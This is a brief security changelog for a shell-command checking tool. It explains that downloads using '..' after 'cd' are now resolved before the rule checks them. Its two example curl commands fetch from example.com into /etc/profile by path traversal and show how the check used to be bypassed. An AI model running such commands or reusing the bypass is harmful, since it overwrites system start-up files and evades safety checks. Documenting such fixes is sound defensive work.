### Security
- A download or redirect that climbs out of a folder with `..` after a `cd` is now read from the folder it lands in. Before, `cd /opt && curl -o ../etc/profile https://example.com/x` was checked as the text `/opt/../etc/profile` and passed the shell start-up file rule; it is now refused like `curl -o /etc/profile`. The Node.js and Python engines behave the same.
- A target that climbs above the home folder (for example `cd ~ && curl -o ../../etc/profile https://example.com/x`) is now resolved from `/home` instead of being cut off there, so it is refused too.
